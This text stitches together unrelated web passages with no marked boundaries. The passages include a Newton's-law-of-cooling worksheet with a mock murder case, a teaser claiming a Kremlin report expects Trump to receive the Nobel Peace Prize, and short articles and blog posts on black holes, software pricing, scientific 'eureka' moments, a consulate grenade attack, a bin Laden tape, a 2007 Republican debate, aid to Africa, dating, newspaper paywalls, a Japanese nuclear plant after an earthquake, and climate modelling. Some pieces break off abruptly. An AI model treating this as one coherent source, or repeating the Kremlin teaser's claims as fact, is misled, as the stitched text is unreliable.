Using function notation you could write T( t ) = A ( 0 ) + ( T( 0 ) - A ( 0 ) ) / exp ( rt ) where r is a rate of cooling number ( 0 < x < 1 ) and t is the time in hours .
T( 0 ) is the temperature of the body and A ( 0 ) is the air timperature in the apartment at t=0 ( time found ) .
Find the constant r by plugging in a few data points from your table , or by xperimenting with different values for r until the graph passes through most of the data points from the table .
This kind of trial and error experimentation is an important and creative side of mathematical modeling .
Ask the teacher for the normal living body temperature fo Mr. Potato Head ( He / She will give you the temperature noted right out of the microwave )
Note : that if we were using a real body we would be using 98.6 degree F. Calculate the time of death .
A review of using natural logarithms may be necessary here .
For example if the air temperature was 50 degrees C at the time the body was discovered and the temperature of the body at time found was 56 degrees C , then the equation might look like this :
T(t ) = 50 degrees C + 6 degrees C / exp ( .5t )
To find the time of death get exp ( .5t ) on one side of the equation and take the log of both sides
exp ( .5t ) = 6 /( T( t ) - 50 ) ln ( exp ( .5t ) ) = ln( 6 /( T( t ) - 50 ) )
Plug in the normal body temperature T( t ) and use your calculator to solve the right side of this equation .
Let 's say that the teacher noted the temperature out of the microwave to be 59 degrees ( time of death ) .
ln ( exp ( .5t ) ) = ln ( 6/( 59 -50 ) ) .5t = -.40547 t = -. 81093
Congratulations !
The time of death would be .81093 hours before the body was discovered .
If the body was discovered at midnight , then the time of death was around 11:11 p.m .
Since your experiment uses a different temperature out of the microwave , what did your investigation find ??
_______ p.m.
Now try this one :
At midnight , police were called to the scene of a brutal murder and found the body of Neils Nieley .
The officer immediately noted that the air temperature in the apartment was 68 degrees F and Niels ' body temperature was 85 degrees .
After the police were finished with their search and fingerprinting at 2:00 they checked the body temperature once more and found it had cooled to 75 degrees .
The police arrested Niels ' wife Narley Nieley and charged here with the murder .
She had an eyewitnesses that said she left Ned 's Bar at 11:15 p.m .
She had just been jilted by Neils and was a good suspect .
Narley 's lawyer Nelson Noodle knew about Newton 's law of cooling and used the function
T(t ) = 68 degrees + 17 degrees / exp (.5207 t)
to find the time of death .
Can you help him prove that Narley could not have done it ?
Explain and show your calculations below .
Are there ary other factors of cooling bodies that should be considered in order to make this process even more accurate ??
An informative new Security Council ( SC ) report circulating in the Kremlin today revealing that there are no plans for President Putin or President Donald Trump to meet or speak before the 3 November election in the United States , notes that this will not interfere with the call expected to be made between these two leaders on 10 December when it ’s expected Trump will receive the Nobel Peace Prize — a prestigious global award powerful Norwegian lawmaker Christian Tybring - Gjedde has just nominated President Trump to receive … Read More »
You know the saying : nothing , not even light can escape a black hole .
That makes them invisible .
Amazingly , researchers from the University of Maryland have determined how fast a supermassive black hole is spinning .
You wo n’t be surprised to know it ’s spinning insanely fast , at the limits predicted by relativity .
The researchers used ESA ’s XMM - Newton X - Ray telescope to examine the quantity of iron in an accretion disk around a supermassive black hole at the centre of galaxy MCG - 06 - 30 - 15 .
Because the disk is spinning so rapidly , the light from the disk is warped relativistically .
According to their calculation , the black hole must be spinning at least 98.7 % of the maximum spin rate allowable by Einstein ’s Theory of General Relativity .
This result helps astronomers understand how black holes grow over time .
If supermassive black holes formed by slowly pulling in surrounding matter , they would be expected to spin faster and faster , until they reach this relativistic limit .
If the supermassive black holes were instead formed by colliding smaller black holes , they ’d be spinning much more slowly .

3 ways to make money with your software Jason 43 comments Latest by Martin
There are three primary ways to generate revenue from web - based software .
Let ’s take a look …
Advertising - supported
Give your product away for free and sell advertising around it .
You can do this with desktop software ( as IM clients usually do ) or web - based software .
It ’s definitely the easy option for web - based software : Just paste in the Google Adwords include and bam , you ’ve got ads .
But pasting in ads does n’t mean you ’re pasting in revenue .
Unless you have massive traffic , revenue can be very hard to come by using this strategy .
This option also does n’t work for password - protected , log - in - required products since Google ca n’t get behind your authentication .
If you want ads on a password - protected app , you ’ll need to sell them yourself — and that ’s a full - time job .
Grade : B-. Personally I do n’t like this model because it throws your priorities off — you ’re beholden to your advertisers and their screen real - estate demands instead of your customers .
It ’s tough to serve these two groups at once since their priorities are likely to be different ;
The advertisers want to win your customers ’ attention but customers want to focus on the task at hand .
A true win -win is tough in this scenario .
Possible , but tough .
Subscription - supported ( or single price )
This option asks the customer to pay for the service .
This model is really saying , “ We think our product is worth paying for and if you agree we ’d love to have you as our customer . ”
It can be a monthly / yearly subscription or a single one - time price like traditional software .
From a revenue standpoint , the subscription model really fits .
If you look at in reverse , your company is subscribing to each customer ’s bank account ( not in an evil way , of course ) .
The downside is that it ’s tough to make a product that people will pay for .
Some customers are willing to pay but are there enough of them to keep you afloat ?
That ’s part of the territory when you sell anything though .
However , if enough of the right customers find you , healthy revenues await .
Plus the people who pay you and the people who use the site are the same .
That helps bring priorities in line .
When there ’s a clear connection between customers and revenue , it ’s a lot easier to focus .
Grade : A. I recommend this model .
If you go into your project thinking you have to build something worth paying for , then you ’ll likely build something worth paying for .
You ’ll try harder because you know it has to be really worth something to people .
Of course , even good ideas sometimes fail .
But building - to - charge puts you in the right mindset to succeed .
One more thing I ’ll say about this :
When people pay for your product they have a vested interest in seeing it succeed .
They want their investment to be a good one .
They want to believe in it and care for it .
And they want you to stick around .
All that helps ignite passion and interest around what you ’re doing and that ’s a very good thing .
Support - supported
This is the strategy of the open - source software movement .
SugarCRM is a good example of this .
Their software is free — but if you want vendor - backed support help you ’ll have to pay for it .
Grade : C+.
On the surface it seems like a good deal , but for who ?
If the revenue model depends on helping people , then there ’s an implicit motivation to make things difficult instead of simplifying and make things easier .
This model punishes tools for being intuitive and easy to use .
In essence , you wind up selling complexity and a secret language that only insiders can speak .
That ’s good for the company but bad for the customer .
A combo meal ?
There are other ways to make money off software too .
You could create a model that mashes up the ones mentioned above , Or you could license your software to other companies to sell or give away .
Or something completely different .
The bottom line
In the end , we think building a real product that people are willing to pay for is the best way to go .
It ’s a dive with a high degree of difficulty , but if you can pull it off you ’ll be swimming in profitable , sustainable waters .

One of science ’s most well loved stories is that of Archimedes , fresh from discovering the principle of buoyancy during a bath , running naked through the streets of Syracuse yelling “ Eureka ! ” ( “ I have found it ! ” )
Unfortunately , the story , told for the first time two centuries after Archimedes ’ death , is hogwash .
Myths like this one sometimes make it seem that science moves along in a series of epiphanies , hopping from one transcendent moment to another .
In reality , science generally pushes forward with all the alacrity of tectonic plates , painstakingly testing and disproving theories until new laws emerge .
But sometimes , very rarely , science really does take a great leap forward .
Here are the seven most exciting and important moments in the entire history of science :
7 Scientists worked like mad at the turn of the 20th century trying to determine how nerve cells transmit messages .
Otto Loewi had heard of an obscure theory that they communicated by releasing pulses of chemicals , but had n’t thought about it for decades until one night in 1920 .
He dreamed of an experiment involving the still - beating hearts of frogs that would test this theory .
He woke up , took copious notes , and returned blissfully to sleep .
In the morning , he found the notes illegible , the insight vanished .
Fortunately , the dream made a repeat appearance the next night , and this time Loewi sprang out of bed and rushed to the laboratory to begin the experiments that helped confirm the chemical transmission of nerve impulses .
6 Young René Descartes was a sickly child .
To shore up his health , he was allowed to sleep until 11 o’clock every morning , a habit he maintained throughout his adult life .
During one of these mornings abed , Descartes watched a fly flit across the ceiling .
He realized he could describe the fly ’s movements and its location by measuring its distance from two perpendicular walls .
A formalized version of this fly - tracking technique became the Cartesian coordinate system of perpendicular lines and planes .
5 The direct current generator that ran the first power plant in the 1870s blinded the world with science , but Nikola Tesla remained underwhelmed :
It was inefficient and broke down easily .
While strolling through a Budapest park in 1882 as the sun was sinking , Tesla pondered this dilemma .
He recited a stanza from his favorite play , Faust , in which a scientist trades his soul for knowledge .
Tesla ’s prodigious brain , possibly desperate to find a new topic , conjured up the design for a reliable and efficient alternating current motor .
Tesla started sketching plans with a stick for the benefit of his walking partner .
4 Long before we had the Hubble Telescope , astronomers were puzzled about the nature of nebulae : odd , faint stars that sometimes looked like spirals .
Some scientists , proponents of the island universe theory , suggested they were galaxies — distinct clusters of stars — millions of light - years away .
Opponents claimed they must be some new sort of star within our own galaxy .
Edwin Hubble solved the entire puzzle from a California hilltop in 1923 .
He examined a famous smudge of light named Andromeda , and noticed that it resolved to a cluster of discrete stars , proving the existence of galaxies other than the Milky Way .
3 Robert Hooke contributed to fields as diverse as astronomy , architecture , paleontology , and physics , but his most important accomplishment was in biology .
In 1665 , he built his own compound microscope and began exploring .
When he peered through its lenses at a thin slice of cork wood , he saw infinitesimal rectangles that reminded him of monks ’ cells .
Hooke thereby discovered biological cells , the fundamental unit of all organisms .
2 In 1896 , physicist Henri Becquerel was fascinated by the recently discovered X -ray .
He thought that naturally fluorescent minerals produced X - rays after prolonged exposure to sunlight .
To test his theory , he let mineral samples soak up the sun and then wrapped them in black cloth with a photographic plate , expecting the resulting X - rays to create weak images .
On a February day too overcast to work , Becquerel wrapped up a plate with a sample of uranium and left it in a drawer for the next few days .
By the time he opened the bundle , the uranium had burned its own image on the film , as clear as if it had been exposed to bright sunlight .
Something in the rock released more energy than weak phosphorescence could explain .
Upon further investigation , he and Marie and Pierre Curie discovered that that something was radioactivity .
1 In 1928 , Alexander Fleming had the archetypal eureka moment — and unlike the tale of Archimedes , this one ’s true .
Believing that there was a substance in snot that worked as an antibiotic , he smeared a set of Petri dishes with bacteria and his own special Fleming phlegm , and left the dishes while he took a two - week vacation .
When here turned , the mucus had not killed any of the bacteria , but mold had drifted in from a nearby lab and contaminated one dish .
All the bacteria close to the mold were dead .
Closer examination of the mold showed that it was producing a chemical — penicillin — that killed the bacteria .
As with any top - whatever list , picking the best eureka moments is a judgment call ; from where we ’re sitting it seems that Fleming ’s discovery was truly a momentous event , that Newton probably did n’t get pelted in the head with an apple , and that Descartes most likely did lie in bed and watch flies ( it was , after all , the 17th century ) .
NEW YORK ( Reuters ) -
Two homemade grenades exploded outside the Mexican Consulate in New York City early on Friday in an incident Police Commissioner Raymond Kelly said was similar to an attack on the British Consulate in 2005 .
Emergency personnel stand near evidence markers in front of the Mexican Consulate in New York , October 26 , 2007 .
Police were investigating the explosion of two makeshift explosive devices outside the Mexican Consulate in New York on Friday , police said .

The grenades exploded about 3:50 a.m. ( 0750 GMT ) on Friday , breaking three windows , Kelly said .
There were people inside the midtown Manhattan building at the time but they did not hear the explosion and there were no injuries , he said .
In May 2005 , two home - made grenades exploded outside an office building , whose tenants include the British Consulate and an executive linked to a company that has attracted protests for selling Israel bulldozers used to raze Palestinian homes .
“ These events are remarkably similar , ” Kelly told reporters .
He said the devices used in both events were similar , the incidents happened about the same time of day and that in both cases a man on was seen riding away on a bicycle .
“ We ’re not aware of any reason as to why this would happen at the Mexican Consulate , ” he said .
Police cordoned off the area outside the building and the bomb squad scoured the scene for evidence .
When asked if it could be linked to Saturday ’s first anniversary of the death of independent U.S. journalist Brad Will in Mexico , Kelly said , “ That ’s something that we ’re looking at .
It ’s all part of the investigation . ”
Will was killed when gunmen opened fire in Mexico ’s colonial city of Oaxaca near roadblocks set up by leftists pushing to topple a state governor .
Initial reports of the 2005 incident drew a connection between the blast and the British Consulate .
But police later said they were investigating another possible target -- a board member of Caterpillar Inc. -- who works in the building .
The company sells bulldozers used by Israel to raze Palestinian homes .
No arrests have been made in the 2005 case .
Okay , it ’s late in the day on Friday , so this post is very tounge - in - cheek .
But , I ca n’t help being amused by some of the latest ramblings from Osama bin Laden :
He says to the American people , “ you made one of your greatest mistakes , in that you neither brought to account nor punished those who waged this war , not even the most violent of its murderers , [ former Defense Secretary Donald ] Rumsfeld … ” “ You permitted Bush to complete his first term , and stranger still , chose him for a second term , which gave him a clear mandate from you — with your full knowledge and consent — to continue to murder our people in Iraq and Afghanistan .
Then you claim to be innocent !
The innocence of yours is like my innocence of the blood of your sons on the 11th — were I to claim such a thing . ”
This guy ’s got to have a media adviser .
The first thing you do is mention George W. Bush , whose approval ratings are in the toilet .
Then , you bring up the Neo - Cons :
Bin Laden says President Bush ’s words echo “ neoconservatives like Cheney , Rumsfeld , and Richard Perle . ”
And , since Americans hate all their politicians right now , the Democrats :
[ Y]ou elected the Democratic Party for this purpose , but the Democrats have n’t made a move worth mentioning .
On the contrary , they continue to agree to the spending of tens of billions to continue the killing and war there . ”
And , to show you care , the economic plight of Americans :
He also speaks to recent issues grabbing headlines in the United States , referring to “ the reeling of many of you under the burden of interest - related debts , insane taxes and real estate mortgages ; global warming and its woes … ”
Hmm , sounds just like the platitudes you hear in the standard political stump speech .
But this quote has to qualify as the single funniest thing I ’ve heard all day :
“ To conclude , ” bin Laden says , “ I invite you to embrace Islam . ”
He goes on to say : “ There are no taxes in Islam , but rather there is a limited Zakaat [ alms ] totaling 2.5 percent . ”
Which just makes you wonder .
Has Osama bin Laden been reading Hayek ?
A 7 minute montage of Ron Paul ’s answers at yesterday ’s debate :
I was able to watch the entire debate live yesterday , which was actually a first to me .
On the whole , I was n’t all that impressed with anyone .
For one thing , CNBC / MSNBC billed the debate as one that would focus solely on the economy and yet , halfway through the debate they started talking about Iraq , Iran and foreign policy .
Yea , I know the economics is the dry science , but they could ’ve at least kept on topic for more than twenty minutes , do n’t you agree ?
As for the candidates .
Paul : Quite honestly , I do n’t think he did that well in this debate .
Part of it was because he really did n’t get that many questions thrown at him ( the seven minute video above pretty much constitutes everything he had to say yesterday during a two hour debate ) , and that ’s the fault of the moderator and the panel .
But even when he did get asked questions , I do n’t get the impression that he really connected with the audience .
The average American does n’t care about the Gold Standard , and they ’re not going to .
They also are n’t going to read Ludwig von Mises anytime soon .
Where was the talk about reducing taxes ?
And why , pray tell , did Ron Paul sound like a Naderite populist yesterday ?
Thompson :
This was Fred Thompson ’s first appearance on a debate stage with the other candidates and while many media outlets and bloggers opined that he did well , I was n’t all that impressed .
Most of what he said is going to appeal to conservatives , and especially economic conservatives , but seemed to suffer from the same wooden delivery that has plagued him since his campaign started .
Romney : Outside of distinguishing himself as the man who would consult the American Bar Association about foreign policy before he ’d talk to the Joint Chiefs of Staff , I ca n’t say that there was anything memorable about Mitt ’s performance , or that he came across to the crowd all that well .
Giuliani : I do n’t like him , but it ’s easy to see why he ’s the Republican front - runner right now .
What he ’s saying are things are going to appeal to mainstream Republicans , whether its on taxes , spending , or government regulation .
The problem is I ca n’t understand why any of those people actually think he ’ll follow through with what he says .
McCain :
The irony of John McCain trying to claim the mantle of the fiscal conservative was really quite amusing to watch .
I doubt anyone bought it , though .
I will say this , though , he did provide the most amusing moment of the debate when he suggested Ron Paul read The Wealth of Nations .
If the opportunity had allowed it , I would ’ve loved it if the Congressman had shot back and suggested the Senator read Economics In One Lesson .
Huckabee : Ummm , yea I ca n’t think of anything either .
Tancredo : Just like Ron Paul has a tendency to turn every question into an opportunity to mention the War in Iraq , Tom Tancredo turns every question into an immigrant - bashing opportunity .
And to think he used to be considered somewhat libertarian .
Hunter : < sound of leaves rustling >
Brownback : Perhaps the most exciting thing to come out of Kansas since ……….
It ’s not shaping up to be a good year folks .
THIS slip of a book is set to become a classic of the “ how to help the world 's poorest ” genre .
Its author , Paul Collier , an Oxford economics professor , has spent 30 - odd years puzzling mainly over sub-Saharan Africa and trying to work out why so many of its 48 countries have become basket cases .
Crammed with statistical nuggets and common sense , his book should be compulsory reading for anyone embroiled in the hitherto thankless business of trying to pull people out of the pit of poverty where the “ bottom billion ” of the world 's population of 6.6 billion seem irredeemably stuck .
Mr Collier reckons that most of the bottom billion live in 58 countries , 70 % of them in Africa and most of the rest in Central Asia .
Since the 1990s , more than 4 billion people in the poor world have begun to move out of the depths of poverty , some of them very fast .
But the countries where the poorest live have barely grown at all since the 1970s .
Most of them are caught , as Mr Collier describes it , in one or more of four traps : wars , in which 73 % of the poorest have been caught at one time or another ; natural resources gone wrong ( think of Nigeria and its oil ) , which accounts for about 30 % ; landlocked with bad neighbours ( look at Chad ) ; and the bad - governance - in - a - small - country trap ( too many to name ) .
What comes most convincingly out of Mr Collier 's book is that aid from the guilt - ridden West is not the answer , or at least not the main answer , and certainly not aid as it has so often been disbursed .
For sure , aid has not been useless .
“ A reasonable estimate is that over the past thirty years [ aid ] has added one percentage point to the annual growth rate of the bottom billion , ” he writes .
“ Aid has been a holding operation preventing things from falling apart . ”
But Mr Collier is sceptical about the mantra of doubling aid to Africa , as the rich countries ' leaders grandly promised at Gleneagles in Scotland two years ago .
“ The statistical evidence generally suggests that aid is subject to what is called ‘ diminishing returns ' , ” he writes .
Take Nigeria .
Over the past 30 years or so , it has received some $ 280 billion “ with depressingly little to show for it ” .
Plainly , vast dollops of aid have gone down the drain .
In one of many statistical cameos , he cites a study showing that only 1 % of € 20 m of aid sent to Chad actually reached the rural health clinics that were its intended target .
The rich world should concentrate , he argues , not on throwing aid at Africa , whether in budget support or projects , but on taking measures to encourage growth , above all through improving trade .
The poor billions of East Asia have begun to race out of poverty not because of aid ( very few received much ) but because the conditions were created for their countries ' economies to grow .
Mr Collier has an array of suggestions , all of them sensible , though some are unlikely to be taken up soon .
For instance , he makes a bold case for military intervention to restore order in failing states ( like Somalia ) ; “ the typical cost of a civil war ” , he calculates , is “ around $ 64 billion . ”
He also lists a raft of laws that should be enacted by Western governments , and of charters , mainly for poor countries to sign up to , that would provide a framework for setting things on the right track .
Five suggested charters — for natural resources revenues , for democracy , for budget transparency , for post - conflict situations , and for investment — set out the sort of norms which , if adhered to by rich governments and poor ones , would help hoist the poorest out of their traps .
In the past two years , two famously opposing clarion calls , one from the aid - loving left , the other from the aid - is - always - wasted sceptical right , have been trumpeted .
The one , Jeffrey Sachs 's “ The End of Poverty ” , exaggerates the value of aid , especially in the massive dollops he proposes .
The other , William Easterly 's “ The White Man 's Burden ” , rightly mocks the delusions of the aid lobby but exaggerates the negative aspect .
Mr Collier , though tending towards the second view , steers a masterly course between the two .
Everyone seems to be trying out online dating these days .
With how common it is , you might think that it ’s an easy process .
The truth , however , is that online dating is n’t always ideal .
Apart from the risk it poses to your security , you can also end up feeling disappointed and frustrated .
If you want to avoid those things , you should probably consider dating offline .
But first , let ’s review a few tips to make it work .
Have a simple goal of making new friends .
Do n’t put too much pressure on yourself .
Seek to find a great friend and see where things lead .
Commit to saying “ Hi ” first .
Do n’t be shy .
Perhaps set a goal of saying hi to 5 people a day .
Start with one a day and then work your way up .
Smile and have fun .
Everyone looks better with a smile .
Be open to meeting new people - anywhere and everywhere .
Always be dressed and groomed to meet new people even if you ’re just running out to get milk .
You just may meet that someone special in the dairy isle !
Be interested in others and ask lots of questions .
Do n’t be afraid of rejection .
You ’ve got nothing to lose !!
What ’s the worst that could happen ?
Someone will laugh at you ?
That ’s hardly likely .
And even if they do , who cares !
Just say “ Next ! ” and move on !
Go slow for safety and success .
Never rush into anything .
Go slow .

Now that we got that out of the way , here are the best ways to find an online date :
Many in the newspaper business have embraced the Internet warily .
For all the promise the Web platform has , it also holds some big pitfalls .
Yes , the online world offers potentially broader audiences and the promise of cutting costs by slicing into publishing and circulation expenses .
But the free content model on the Web is particularly scary for newspapers .
If the content online is free , why would people bother to subscribe to the paper ?
And once enough readers flee , circulation falls and advertisers find less reason to buy ad space .
Perhaps even more alarming , the numbers increasingly suggest that online ads may never match the revenue base that print ads do .
This is precisely the situation many newspaper publishers find themselves in today .
They can't ignore the Web .
They understand they have to find a way to move online .
But they are n't exactly happy about it and they are unsure how the economics are going to play out .
The last two weeks have only added to the sense of uncertainty .
The American newspaper industry 's two giants – The New York Times and The Wall Street Journal – which have both made users pay for some content , are reportedly looking at giving in and joining the free - content crowd .
For the Journal , the speculation has come with the purchase of the paper by Rupert Murdoch .
Some believe that Mr. Murdoch 's goal is to make the Journal much more than a required read by the nation 's MBA class .
Many analysts believe he wants to make the paper a national , politically conservative alternative to the Times .
That goal , plus the desire to increase online audience and ad revenue reportedly has Murdoch thinking about removing the Journal 's pay - to - read firewall – or at least parts of it .
There are roughly 1 million online Journal subscribers each paying $ 79 a year .
It has been a remarkably successful exception to the mostly free - content world .
For the Times , the question is about the fate of TimesSelect , the enhanced online subscription that the paper launched two years ago .
The Times made some Web content – namely the paper 's prominent columnists and some online bonuses – available only to those who paid $ 50 a year or subscribed to the print paper .
It was aimed at the I - need - my - Tom - Freidman - now set .
How big is that crowd ?
There were about 225,000 of them as of June .
But critics of TimesSelect , and there have been many , have long held that it lessens the impact of the columnists by allowing fewer people to read them .
One of those critics is Times columnist Maureen Dowd .
A report last week in , of all places , the Murdoch - owned New York Post , said the paper was considering junking TimesSelect .
The response from the website 's general manager was less - than - Shermanesque : " We 're still looking at the situation . "
What does all this mean ?
If both the Times and Journal abandon the idea of pay - to - read content , it is essentially dead for the time being on the Web .
That may not sound like such a big deal .
After all , as anyone who Googles enough knows , fee content does n't necessarily stay that way for long .
Any blogger who understands basic " cut " and " paste " commands can turn " fee content " into " free content " with a few clicks of a mouse .
In addition , there is a social networking news culture developing on the Web that thrives on sharing news accounts .
The more news that 's free , the more that can be shared .
These sites , like digg.com , are particularly popular with younger news consumers , which newspapers are desperate to reach .
And , from a purely selfish standpoint , who is against getting anything for free ?
But the demise of pay - for - news on the Web would also mean we are still a long way from figuring out how news organizations will function in the new news world .
Online ad revenues may be growing like weeds , but the growth rate has begun to slow sooner than expected .
Even the most optimistic projections suggest if they keep growing at their current rate it will take more than a decade for them to equal the money that comes in from print newspaper ads .
But no one expects them to keep growing at the current rate .
Somehow , newsrooms need to find new revenue sources , or they wo n't be able to cover as much news .
Online fee content probably is n't going to be the answer for newspapers , but some thought it might be part of an answer .
Now it seems that , for the time being at least , it probably wo n't be , at least not with the current approaches .
What these changes would really mean is that the fast and furiously evolving world of news gathering is a little cloudier this week than it was last month .

The world 's biggest nuclear power station faces an uncertain future after it emerged today that it may lie directly above the fault line that triggered this week 's earthquake in which nine people died and more than 1,000 were injured .
The Kashiwazaki - Kariwa plant - the biggest in the world in terms of output capacity - has been shut down indefinitely after it shook violently when an earthquake measuring 6.8 on the Richter scale struck Niigata prefecture in northern Japan on Monday .
The plant was not designed to resist shaking caused by earthquakes of greater than magnitude 6.5 .
On another day of embarrassment for Japan 's nuclear power industry , the Tokyo Electric Power company [ Tepco ] , which operates the plant , said the amount of radioactivity in water that leaked into the sea during the earthquake was 50 % higher than it originally said .
The firm blamed a calculation error and said the levels were still well within safety standards .
It also said that 400 drums of low - level radioactive waste - not 100 originally reported - had toppled over during the quake .
About 40 lost their lids , spilling their contents on to the ground .
The spillage was one of more than 50 malfunctions the plant experienced in the immediate aftermath of the quake .
International nuclear inspectors said they were concerned by Tepco 's apparent lack of preparedness for such a powerful earthquake .
" It is clear that this earthquake ... was stronger than the reactor was designed for , " Mohamed ElBaradei , the head of the International Atomic Energy Agency , told reporters in Kuala Lumpur .
" It does n't mean that the reactor structure or system has been damaged .
I would hope and I trust that Japan would be fully transparent in its investigation of that accident .
The agency would be ready to join Japan through an international team in reviewing that accident and drawing the necessary lessons . "
The mayor of Kashiwazaki , Hiroshi Aida , ordered Tepco to close the plant indefinitely until its safety could be assured .
" I am worried , " he said .
" It would be difficult to restart operations at this time .
The safety of the plant must be assured before it is reopened . "
The closure has forced the firm to ask six other power utilities to supply it with additional electricity until end of September to avoid power cuts when demand peaks later this summer .
Tepco is under pressure to explain why it took so long to inform the authorities of radioactive leaks and why only four employees were on hand to tackle a fire inside an electrical transformer that was only extinguished after firefighters arrived almost 90 minutes later .
The mishaps have raised questions about the wisdom of building nuclear power stations in a country where earth tremors are recorded , on average , every few minutes .
New safety regulations were brought in last year , but upgrading ageing reactors so that they can withstand tremors of a greater magnitude than 6.5 will require huge investment .
Akira Fukushima , the deputy director general of Japan 's Nuclear and Industrial Safety Agency , said no irregularities had been found in critical areas of the plant but added : " It is possible that the epicentre fault line does run beneath the power plant .
Our decision on what to do in the future will depend on the report we get from Tepco . "
Inspectors reportedly identified four fault lines in the area while conducting a geological survey before work began on the Kashiwazaki plant in 1980 but concluded that they were inactive , according to the Asahi newspaper .
The Citizen 's Nuclear Information Centre said that the fault believed to have triggered the earthquake was not discovered during pre-construction surveys .
" Clearly Japan 's earthquake safety standards are inadequate , " it said in a statement .
Tepco 's president , Tsunehisa Katsumata , defended the firm 's response .
" It is hard to make everything go perfectly , " he told reporters during a visit to the site .
" We will conduct an investigation from the ground up , but I think fundamentally we have confirmed that our safety measures work . "
Japan , which has very few indigenous energy sources , depends on 55 nuclear plants for 30 % of its electricity .
Despite several accidents and mounting public opposition to nuclear power , it plans to increase capacity to 40 % by the end of the decade .
Backstory : nuclear accidents in Japan
Only France and the US have more nuclear power stations than Japan , where the first plant went into service in 1966 .
Japan 's 55 plants have a total generating capacity of 49,470 megawatts , supplying just under a third of the country 's electric power output .
The industry has been plagued by accidents and cover-ups in recent years .
September 30 1999 : Two workers died after setting off an uncontrolled nuclear chain reaction at a uranium processing plant in Tokaimura , north of Tokyo .
The workers had been mixing nuclear fuel in buckets .
Thousands of residents were evacuated .
September 2002 : The Tokyo Electric Power company , Japan 's biggest power utility , is ordered to shut down all 17 of its reactors after it admitted falsifying safety data .
August 9 2004 : Five workers are scalded to death when boiling water and steam leak from a badly decayed pipe at the Mihama No 3 nuclear power plant .
July 16 2007 : Kashiwazaki - Kariwa nuclear power plant , on Japan 's north - west coast , is closed indefinitely after a powerful earthquake causes a fire , minor radioactive leaks and dozens of other malfunctions .
To those of us who are not climate scientists , it may come down to this :
How can we be so certain what the climate will be like a century from now if you can't get a decent weather forecast more than two weeks ahead ?
In the end , is n't climate change just too complex ?
True , weather forecasters are fallible , and there is no planet out there similar to Earth so we can truly gauge the effect human activity is having on our climate .
But climate researchers are increasingly confident of their models and simulations .
Besides , some argue , predicting the weather is tougher than predicting the climate , and scientists have been working on perfecting climate models for more than a century .
In a chilled , windowless room here at the National Oceanic and Atmospheric Administration 's Geo­physical Fluid Dy­­namics Laboratory ( GFDL ) , a supercomputer is furiously crunching numbers in an attempt to mimic Earth 's climate system .
It 's a tool Svante Arrhenius could only dream about .
In 1896 , the mustachioed Swede gave the first detailed description of carbon dioxide 's warming effect on climate .
He had to solve some 10,000 equations to do it .
Armed with his crude climate model , he reckoned that if the amount of CO2 in the atmosphere doubled , global average temperatures might rise by up to 9 degrees F. Today 's modelers say his estimate is high – but not by much .
Today 's climate models try to simulate more than one feature – more than Arrhenius 's CO2 – of the climate system and in greater detail .
They 're still far from perfect and miss important processes .
It 's complicated , modelers say .
And there will always be uncertainties .
But modeling is the only way to tackle some of the questions they and their colleagues are asking about the climate , they add .
Field measurements and observations are critical , notes Michael Winton , a member of the model - development team at the GFDL .
They serve as a reality check on models and may spur further observations .
In the end , however , " you ca n't end with observations .
At the most basic level , you want to say something about the future .
And there is n't any way to put these observations together that would give you any detail about the future . "
Moreover , Earth has no identical twin nearby undergoing the same basic physical processes but unaffected by human activity .
The only place to approximate that " twin " is inside a supercomputer .
Thus , " simulation – and not just in climate and weather but in a lot of different fields – has become a third leg , in addition to theory and observation , to help us figure out what 's going on , " says Brian Gross , the GFDL 's deputy director .
The building blocks for many of today 's climate models are modules that simulate conditions in the atmosphere , ocean , on land , and around sea ice .
Researchers use historical measurements to set the sea level , as well as levels of atmospheric gases , airborne particles , and sunlight for each year they include in the model .
Then they turn the model loose to calculate how wind , temperature , air pressure , and moisture patterns over a particular period will evolve .
In early models , researchers say , large adjustments were needed to keep climate models from spinning off into the twilight zone .
The adjustments had no real - world climate counterpart ; they were made to keep the simulations plausible .
As models have improved , the need for such intervention has receded , and any tweaking has reflected real - world observation .
Such interventions have led some to say that modelers are merely telling the model to yield a specific result .
Dr. Winton dismisses that charge .
" People overestimate the control we have , " he says .
With more powerful computers , scientists have been able to model climate behavior over shorter timespans .
The need to intervene in the models is disappearing but not likely to vanish , says Caroline Katsman , a researcher at the Royal Netherlands Meteorological Institute in De Bilt .
No computer can crunch numbers for every point on the globe .
One measure of a model 's success is how well it captures the main features of natural climate variation .
Assuming it can do that , researchers can then use the model to test ideas about atmospheric conditions and their plausible causes .
Last month , for example , researchers at NOAA 's Earth Systems Research Laboratory in Boulder , Colo. , concluded that slightly more than half the unusual warmth the United States experienced in 2006 was probably due to the buildup of greenhouse gases in the atmosphere .
The team , led by Martin Hoerling , took on the study when NOAA announced in January that 2006 had been nearly 2 degrees F. warmer than normal .
NOAA could n't say why .
It may have been El Niño ( a periodic warming of the eastern Pacific that has profound climatic effects ) ; it may have been a rise in greenhouse gases .
How models pointed to CO2
Dr. Hoerling 's team looked at historical data and calculated that the 2006 increase was unlikely to have occurred through natural fluctuations alone .
When they looked at temperature data from 10 previous El Niño years , they found that average temperatures over the US had not changed or had cooled slightly .
Could El Niño - like conditions cool the US ?
They ran a climate model , and found the answer was yes .
So if El Niño was unlikely to have caused 2006's warming , did greenhouse gases ?
Using the modeling data the Intergovernmental Panel on Climate Change used in its latest report , the team found that more than half the increase could be attributed to greenhouse gases .
Scientists have used a similar approach to implicate greenhouse - gas emissions from human activities in warming over the past 30 years .
In short , the only way to reproduce late 20th - century warming is to include the growth in greenhouse gases .
Modeling results are not the only line of evidence , researchers say .
But in combination with other lines of evidence , the case becomes more persuasive .
But why should we trust climate models any more than a three - week weather forecast ?
Roger Pielke Sr. , a research scientist at the University of Colorado at Boulder who focuses on land - atmosphere interactions , notes that climate forecasting is more complicated than weather forecasting .
Far more processes are involved .
Keith Dixon , who managed the GFDL 's contribution to recent IPCC modeling efforts , adds that climate predicting and weather forecasting are much different , as are the measures of success .
The accuracy of a weather forecast depends largely on the quality of the twice - daily global atmospheric measurements used .
Weather conditions trigger weather - forecast models , and such conditions are far more susceptible to " the flapping of the butterfly 's wings , " Dr. Dixon says .
He 's referring to well - established ideas about how small - scale , chaotic features can grow over time and affect weather at great distances .
That 's why today 's weather forecasts do n't have much use beyond two weeks .
Looking at climate over decades or a century or more , " we 're dealing more with boundary forcings " external to the climate system , Dixon says – solar radiation , aerosols , changes in atmospheric CO2 .
" The key is how the model will respond to changes in these forcing agents , " and not whether it will rain in New York on Tuesday .
Global climate models can't predict the next El Niño or volcanic eruption , both of which affect climate .
The critical point for climate models , Dixon continues , is to reproduce the climate 's random variability over time in a realistic way .
